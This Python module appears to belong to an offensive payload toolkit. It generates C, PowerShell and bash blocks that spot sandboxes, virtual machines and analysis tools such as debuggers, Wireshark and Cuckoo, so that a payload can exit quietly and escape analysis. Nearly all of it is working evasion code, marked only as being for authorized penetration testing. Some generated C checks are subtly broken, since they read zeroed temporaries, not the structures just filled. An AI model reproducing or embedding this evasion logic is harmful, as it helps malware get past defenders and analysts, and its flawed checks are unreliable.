"""Sandbox Detection Code Generator.

Generates C and PowerShell code that detects common sandbox/AV emulator
environments and exits cleanly if running in one.

Checks (configurable):
  - CPU core count < threshold (sandboxes use 1-2 cores)
  - Physical RAM < threshold (sandboxes often have < 2 GB)
  - System uptime < threshold (freshly booted VMs)
  - Disk size < threshold (sandbox VMs have small disks)
  - Screen resolution too low (headless sandboxes: 800x600)
  - Cursor not moving (automated sandbox: no mouse activity)
  - Known analysis tool names in process list
  - VM artifacts: registry keys, DMI strings, MAC prefixes
  - Sleep acceleration: sleep(1s) should take ~1000ms

FOR AUTHORIZED PENETRATION TESTING ONLY.
"""
from __future__ import annotations

import textwrap
from dataclasses import dataclass, field


@dataclass
class SandboxConfig:
    """Configuration for sandbox detection checks."""
    min_cores:        int        = 2
    min_ram_gb:       float      = 2.0
    min_uptime_min:   int        = 10
    min_disk_gb:      float      = 30.0
    min_screen_width: int        = 1024
    check_cursor:     bool       = True
    check_vm_reg:     bool       = True
    check_processes:  bool       = True
    check_sleep_accel: bool      = True
    exit_on_detect:   bool       = True
    known_tools: list[str] = field(default_factory=lambda: [
        "wireshark", "fiddler", "processhacker", "procmon", "procexp",
        "regmon", "filemon", "vboxservice", "vmtoolsd", "vmsrvc",
        "sandboxiedcomlaunch", "sbiesvc", "cuckoo", "anubis", "joe",
        "pestudio", "x64dbg", "x32dbg", "ollydbg", "ida", "idaq",
        "dnspy", "de4dot", "die", "pe-bear",
    ])
    vm_reg_keys: list[str] = field(default_factory=lambda: [
        "HARDWARE\\ACPI\\DSDT\\VBOX__",
        "HARDWARE\\ACPI\\FADT\\VBOX__",
        "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        "SOFTWARE\\VMware, Inc.\\VMware Tools",
        "SYSTEM\\ControlSet001\\Services\\VBoxSF",
        "SYSTEM\\ControlSet001\\Services\\vmhgfs",
        "SYSTEM\\ControlSet001\\Services\\vmmouse",
        "SYSTEM\\ControlSet001\\Services\\vmci",
        "HARDWARE\\Description\\System\\CentralProcessor\\0",
    ])


class SandboxDetect:
    """Generate sandbox-detection code blocks for embedding in payloads."""

    def __init__(self, config: SandboxConfig | None = None):
        self.cfg = config or SandboxConfig()

    # ── Public API ─────────────────────────────────────────────────────

    def c_block(self) -> str:
        """Return a C function that runs all enabled checks.

        Returns: 1 if sandbox detected, 0 if safe to continue.
        Usage in loader:
            if (is_sandbox()) { return 0; }  /* exit clean */
        """
        return self._gen_c_block()

    def ps1_block(self) -> str:
        """Return a PowerShell code block that exits if sandbox detected."""
        return self._gen_ps1_block()

    def bash_block(self) -> str:
        """Return a bash code block that exits if sandbox detected."""
        return self._gen_bash_block()

    # ── C Generation ──────────────────────────────────────────────────

    def _gen_c_block(self) -> str:
        cfg = self.cfg
        checks = []

        if cfg.min_cores > 0:
            checks.append(self._c_cpu_cores(cfg.min_cores))
        if cfg.min_ram_gb > 0:
            checks.append(self._c_ram(cfg.min_ram_gb))
        if cfg.min_uptime_min > 0:
            checks.append(self._c_uptime(cfg.min_uptime_min))
        if cfg.min_disk_gb > 0:
            checks.append(self._c_disk(cfg.min_disk_gb))
        if cfg.min_screen_width > 0:
            checks.append(self._c_screen(cfg.min_screen_width))
        if cfg.check_cursor:
            checks.append(self._c_cursor())
        if cfg.check_sleep_accel:
            checks.append(self._c_sleep_accel())
        if cfg.check_vm_reg:
            checks.append(self._c_vm_registry(cfg.vm_reg_keys))
        if cfg.check_processes:
            checks.append(self._c_processes(cfg.known_tools))

        checks_code = "\n".join(f"    if ({c}) return 1;" for c in checks)

        return textwrap.dedent(f"""\
        /*
         * Forge Payload — Sandbox Detection Block
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         *
         * Usage: if (is_sandbox()) return 0;
         */
        #define WIN32_LEAN_AND_MEAN
        #include <windows.h>
        #include <tlhelp32.h>
        #include <string.h>
        #include <ctype.h>

        static int _str_icontains(const char *hay, const char *needle) {{
            size_t hn = strlen(hay), nn = strlen(needle);
            if (nn > hn) return 0;
            for (size_t i = 0; i <= hn - nn; i++) {{
                size_t j;
                for (j = 0; j < nn; j++)
                    if (tolower((unsigned char)hay[i+j]) != tolower((unsigned char)needle[j])) break;
                if (j == nn) return 1;
            }}
            return 0;
        }}

        static int _reg_key_exists(const char *path) {{
            HKEY hk;
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, path, 0, KEY_READ, &hk) == ERROR_SUCCESS) {{
                RegCloseKey(hk); return 1;
            }}
            return 0;
        }}

        static int is_sandbox(void) {{
        {checks_code}
            return 0;  /* safe */
        }}
        """)

    def _c_cpu_cores(self, min_cores: int) -> str:
        return (f"(GetSystemInfo(&(SYSTEM_INFO){{0}}), "
                f"((SYSTEM_INFO){{0}}).dwNumberOfProcessors < {min_cores})")

    def _c_ram(self, min_gb: float) -> str:
        min_mb = int(min_gb * 1024)
        return (f"(GlobalMemoryStatusEx(&(MEMORYSTATUSEX){{sizeof(MEMORYSTATUSEX)}}), "
                f"((MEMORYSTATUSEX){{sizeof(MEMORYSTATUSEX)}}).ullTotalPhys "
                f"/ (1024*1024) < {min_mb})")

    def _c_uptime(self, min_min: int) -> str:
        min_ms = min_min * 60 * 1000
        return f"(GetTickCount64() < {min_ms}ULL)"

    def _c_disk(self, min_gb: float) -> str:
        min_bytes = int(min_gb * 1024 * 1024 * 1024)
        return (f"(GetDiskFreeSpaceExA(\"C:\\\\\", NULL, "
                f"&(ULARGE_INTEGER){{0}}, NULL), "
                f"((ULARGE_INTEGER){{0}}).QuadPart < {min_bytes}ULL)")

    def _c_screen(self, min_w: int) -> str:
        return f"(GetSystemMetrics(SM_CXSCREEN) < {min_w})"

    def _c_cursor(self) -> str:
        return textwrap.dedent("""\
        ({{
            POINT p1, p2;
            GetCursorPos(&p1);
            Sleep(100);
            GetCursorPos(&p2);
            (p1.x == p2.x && p1.y == p2.y);
        }})""")

    def _c_sleep_accel(self) -> str:
        return textwrap.dedent("""\
        ({{
            DWORD t0 = GetTickCount();
            Sleep(500);
            DWORD elapsed = GetTickCount() - t0;
            (elapsed < 400);  /* sleep was accelerated */
        }})""")

    def _c_vm_registry(self, keys: list[str]) -> str:
        checks = " || ".join(f'_reg_key_exists("{k}")' for k in keys)
        return f"({checks})"

    def _c_processes(self, tools: list[str]) -> str:
        tool_checks = " || ".join(
            f'_str_icontains(pe.szExeFile, "{t}")'
            for t in tools[:10]  # cap to avoid massive code
        )
        return textwrap.dedent(f"""\
        ({{
            HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
            int found = 0;
            if (Process32First(snap, &pe)) {{
                do {{
                    if ({tool_checks}) {{ found = 1; break; }}
                }} while (Process32Next(snap, &pe));
            }}
            CloseHandle(snap);
            found;
        }})""")

    # ── PowerShell Generation ──────────────────────────────────────────

    def _gen_ps1_block(self) -> str:
        cfg    = self.cfg
        checks = []

        if cfg.min_cores > 0:
            checks.append(
                f"(Get-WmiObject Win32_ComputerSystem).NumberOfLogicalProcessors -lt {cfg.min_cores}")
        if cfg.min_ram_gb > 0:
            min_bytes = int(cfg.min_ram_gb * 1024 * 1024 * 1024)
            checks.append(
                f"(Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt {min_bytes}")
        if cfg.min_uptime_min > 0:
            checks.append(
                f"(New-TimeSpan -Start (gcim Win32_OperatingSystem).LastBootUpTime).TotalMinutes -lt {cfg.min_uptime_min}")
        if cfg.check_processes:
            procs = "|".join(cfg.known_tools[:8])
            checks.append(
                f"(Get-Process | Where-Object {{ $_.Name -match '{procs}' }}).Count -gt 0")
        if cfg.check_vm_reg:
            for k in cfg.vm_reg_keys[:3]:
                checks.append(f"(Test-Path 'HKLM:\\{k}')")
        if cfg.check_sleep_accel:
            checks.append(
                "(([System.Diagnostics.Stopwatch]::StartNew() | ForEach-Object { Start-Sleep -Milliseconds 500; $_.ElapsedMilliseconds }) -lt 400)")

        cond = " -or `\n    ".join(checks)
        exit_action = "exit 0" if cfg.exit_on_detect else "Write-Host 'Sandbox detected'"

        return textwrap.dedent(f"""\
        # Forge Payload — Sandbox Detection (PowerShell)
        # FOR AUTHORIZED PENETRATION TESTING ONLY.
        $ErrorActionPreference = 'SilentlyContinue'
        if (
            {cond}
        ) {{
            {exit_action}
        }}
        """)

    # ── Bash Generation ────────────────────────────────────────────────

    def _gen_bash_block(self) -> str:
        cfg = self.cfg
        lines = [
            "#!/usr/bin/env bash",
            "# Forge Payload — Sandbox Detection (bash)",
            "# FOR AUTHORIZED PENETRATION TESTING ONLY.",
        ]

        if cfg.min_cores > 0:
            lines.append(
                f'[ "$(nproc 2>/dev/null || echo 1)" -lt {cfg.min_cores} ] && exit 0')
        if cfg.min_ram_gb > 0:
            min_kb = int(cfg.min_ram_gb * 1024 * 1024)
            lines.append(
                f'[ "$(grep MemTotal /proc/meminfo | awk \'{{print $2}}\')" -lt {min_kb} ] && exit 0')
        if cfg.min_uptime_min > 0:
            lines.append(
                f'[ "$(awk \'{{print int($1/60)}}\' /proc/uptime)" -lt {cfg.min_uptime_min} ] && exit 0')
        if cfg.min_disk_gb > 0:
            min_mb = int(cfg.min_disk_gb * 1024)
            lines.append(
                f'[ "$(df / | tail -1 | awk \'{{print int($4/1024)}}\')" -lt {min_mb} ] && exit 0')
        if cfg.check_processes:
            proc_pat = "|".join(cfg.known_tools[:6])
            lines.append(
                f'pgrep -fi "{proc_pat}" >/dev/null 2>&1 && exit 0')

        return "\n".join(lines) + "\n"
